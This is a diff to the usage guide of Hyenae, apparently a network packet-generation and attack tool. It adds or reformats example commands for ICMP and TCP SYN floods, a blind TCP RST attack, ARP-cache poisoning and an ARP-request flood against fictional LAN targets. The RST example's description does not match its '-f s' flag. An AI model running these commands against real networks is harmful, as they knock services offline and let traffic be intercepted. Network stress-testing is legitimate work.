@@ -90,27 +90,46 @@
   the target host is on the same subnet as you are.
 
     5.1 ICMP-Echo Flood
-      This example will send a random amount of ICMP-Echo packets between 1 and
-      10000 against a fictional target from a random source.
 
-      # hyenae -I 3 -a icmp-echo -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
-      # -c 1 -c 10000
+    This example will send a random amount of ICMP-Echo packets between 1 and
+    10000 to a fictional target from a random source.
+
+    # hyenae -I 3 -a icmp-echo -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
+    # -c 1 -c 10000
 
     5.2 TCP-SYN Attack
-      This example will send an unlimited amount of TCP packets with set SYN
-      flag against a fictional target from a random source and a random send
-      delay between 1 and 1000 milliseconds.
 
-      # hyenae -I 3 -a tcp -f s -s %-%@% -d 00:f0:21:03:c6:00-192.168.0.1@21 \
-      # -e 1 -E 1000
+    This example will send an unlimited amount of TCP packets with set SYN
+    flag to a fictional target from a random source and a random send
+    delay between 1 and 1000 milliseconds.
+
+    # hyenae -I 3 -a tcp -f s -s %-%@% -d 00:f0:21:03:c6:00-192.168.0.1@21 \
+    # -e 1 -E 1000
 
     5.3 Blind TCP Brute-RST Attack
-      This example will send an unlimited amount of TCP packets with set RST
-      flag against a fictional target from fictional random source and an
-      incrementing TCP sequence number.
 
-      # hyenae -I 3 -a tcp -f s -s 00:c0:33:d4:03:06-192.168.0.2@1093 \
-      # -d 00:f0:21:03:c6:00-192.168.0.1@21 -q 1 -Q 1
+    This example will send an unlimited amount of TCP packets with set RST
+    flag to a fictional target from fictional random source and an
+    incrementing TCP sequence number.
+
+    # hyenae -I 3 -a tcp -f s -s 00:c0:33:d4:03:06-192.168.0.2@1093 \
+    # -d 00:f0:21:03:c6:00-192.168.0.1@21 -q 1 -Q 1
+
+    5.4 ARP-Cache Poisoning
+
+    This example will send an ARP-Reply packet from a fictional source address
+    to all available machines on the network.
+
+    # hyenae -I 3 -a arp-reply -s 00:f0:21:03:c6:00 -d ff:ff:ff:ff:ff:ff \
+    # -S 11:22:33:44:55:66-192.168.0.1 -T ff:ff:ff:ff:ff:ff-0.0.0.0 -c 1
+
+    5.5 ARP-Request Flood
+
+    This attack will send an unlimited amount of ARP-Request packets from a
+    random source to all available machines on the network.
+
+    # hyenae -I 3 -a arp-request -s % -d ff:ff:ff:ff:ff:ff \
+    # -S %-% -T 00:00:00:00:00:00-192.168.0.1
 
 --------------------------------------------------------------------------------
 
